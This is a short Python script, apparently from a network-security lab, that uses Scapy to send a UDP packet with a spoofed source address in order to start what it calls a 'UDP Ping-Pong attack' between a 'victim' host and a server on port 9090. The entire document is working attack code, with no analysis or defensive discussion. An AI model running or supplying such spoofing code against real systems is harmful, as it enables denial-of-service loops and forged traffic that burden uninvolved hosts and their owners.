# Anurag's Attack

from scapy.all import IP, UDP, Raw, send

# Spoofed source IP (Victim) and destination IP (Server)
VICTIM_IP = "10.9.0.5"
SERVER_IP = "10.9.0.2"
PORT = 9090

print(f"Starting UDP Ping-Pong attack: Spoofing {VICTIM_IP} -> {SERVER_IP}:{PORT}")

# Construct the spoofed UDP packet
spoofed_packet = IP(src=VICTIM_IP, dst=SERVER_IP) / UDP(dport=PORT, sport=PORT) / Raw(load="Anurag's Attack")

# Send the packet
send(spoofed_packet, verbose=True)

print("Packet sent!")

